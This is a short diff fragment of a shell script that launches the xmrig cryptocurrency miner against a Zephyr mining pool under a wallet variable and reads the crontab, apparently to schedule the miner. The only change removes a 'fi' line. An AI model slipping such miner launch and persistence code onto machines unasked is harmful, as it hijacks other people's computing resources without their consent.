@@ -17,7 +17,7 @@ random_number=$(shuf -i 10000000-99999999 -n 1)
 command="./xmrig --coin zephyr --url \"zeph.kryptex.network:8888\" --user \"$wallet/$random_number\" --tls -k"
 existing_crontab=$(crontab -l 2>/dev/null)
 
-fi
+
 
 ping -c 4 $HOST > /dev/null
 
